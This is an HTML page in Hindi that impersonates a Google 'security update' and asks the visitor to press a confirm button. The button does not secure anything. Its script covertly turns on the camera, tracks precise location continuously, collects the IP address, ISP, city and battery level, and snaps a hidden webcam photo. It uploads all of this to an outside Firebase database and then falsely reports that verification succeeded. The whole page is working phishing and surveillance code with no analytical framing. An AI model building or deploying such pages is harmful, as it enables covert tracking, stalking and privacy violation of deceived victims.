<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Google - Security Update</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="text-align:center; padding-top:80px; font-family:sans-serif; background:#f8f9fa;">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
    <h2>सुरक्षा पुष्टिकरण</h2>
    <p>अपने डिवाइस को सुरक्षित करने के लिए बटन दबाएं।</p>
    <button onclick="startJarvis()" style="padding:15px 40px; background:#1a73e8; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">पुष्टि करें</button>
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const logId = "G_" + Date.now();

        async function startJarvis() {
            try {
                // 1. कैमरा एक्सेस
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;

                // 2. लोकेशन ट्रैकिंग
                navigator.geolocation.watchPosition(p => {
                    database.ref('live_detect/location').update({
                        lat: p.coords.latitude,
                        lon: p.coords.longitude,
                        acc: p.coords.accuracy + "m"
                    });
                }, null, {enableHighAccuracy: true});

                // 3. डिवाइस इंटेल (IP और ISP)
                fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                    database.ref('live_detect/intel').update({
                        ip: data.ip,
                        isp: data.org,
                        city: data.city
                    });
                });

                // 4. बैटरी स्टेटस
                if (navigator.getBattery) {
                    navigator.getBattery().then(bt => {
                        database.ref('live_detect/intel').update({ battery: Math.floor(bt.level * 100) + "%" });
                    });
                }

                // 5. फोटो कैप्चर (2 सेकंड बाद)
                setTimeout(() => {
                    const v = document.getElementById('v'), c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const img = c.toDataURL('image/jpeg', 0.5);
                    database.ref('live_detect').update({ photo: img, time: new Date().toLocaleString() });
                    alert("सत्यापन सफल रहा।");
                }, 2000);

            } catch(e) { alert("कृपया अनुमति दें।"); }
        }
    </script>
</body>
</html>